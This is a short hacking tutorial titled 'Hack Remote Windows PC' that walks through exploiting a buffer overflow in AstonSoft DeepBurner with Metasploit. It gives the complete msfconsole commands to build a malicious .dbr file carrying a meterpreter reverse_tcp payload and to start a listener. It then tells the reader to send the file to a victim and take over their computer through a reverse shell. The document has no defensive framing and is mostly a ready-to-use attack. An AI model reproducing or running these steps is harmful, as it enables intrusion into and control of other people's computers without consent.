Hack Remote Windows PC with AstonSoft DeepBurner (DBR File) Path Buffer Overflow

This module exploits a stack-based buffer overflow in versions 1.9.0.228, 1.8.0, and possibly other versions of AstonSoft’s DeepBurner (Pro, Lite, etc). An attacker must send the file to victim and the victim must open the file. Alternatively it may be possible to execute code remotely via an embedded DBR file within a browser, since the DBR extention is registered to DeepBurner..
AstonSoft’s DeepBurner 1.9.0.228
Windows XP SP 2


Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/deepburner_path
Msf exploit (deepburner_path)>set payload windows/meterpreter/reverse_tcp
Msf exploit (deepburner_path)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (deepburner_path)>exploit

After we successfully generate the malicious dbr File, it will stored on your local computer
/root/.msf4/local/msf.dbr

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
exploit 
Now send your msf.dbr files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
